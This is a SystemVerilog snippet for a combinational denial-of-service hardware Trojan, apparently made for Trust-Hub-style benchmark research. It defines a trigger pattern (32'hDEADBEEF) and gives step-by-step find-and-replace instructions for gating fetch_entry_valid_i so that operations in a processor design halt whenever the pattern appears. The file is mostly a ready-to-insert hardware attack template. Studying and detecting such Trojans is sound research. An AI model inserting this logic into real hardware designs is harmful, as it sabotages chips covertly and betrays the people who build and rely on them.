/**
 * Combinational DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables operations by blocking fetch_entry_valid_i based on pattern match
 *   
 * Trigger: Pattern match on fetch_entry_valid_i
 * Payload: Force fetch_entry_valid_i = 0 when pattern detected
 * 
 * NOTE: This is for COMBINATIONAL modules (no clock/registers).
 *       Uses immediate pattern matching, not counters.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Pattern-based, immediate)
// ============================================================

// Magic pattern that activates the trojan
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

// Trojan activates when trigger signal matches pattern
wire trojan_active;
assign trojan_active = (fetch_entry_valid_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block fetch_entry_valid_i when pattern detected
//
// METHOD 1: If signal has assign statement
//   Find:
//     assign fetch_entry_valid_i_internal = fetch_entry_valid_i;
//   Replace:
//     assign fetch_entry_valid_i_internal = fetch_entry_valid_i && !trojan_active;
//
// METHOD 2: If used in combinational logic
//   Find:
//     assign output = fetch_entry_valid_i & other_signals;
//   Replace:
//     assign output = (fetch_entry_valid_i && !trojan_active) & other_signals;
//
// Effect: When trojan_active = 1, fetch_entry_valid_i is effectively 0
//         All operations controlled by this signal stop = DoS!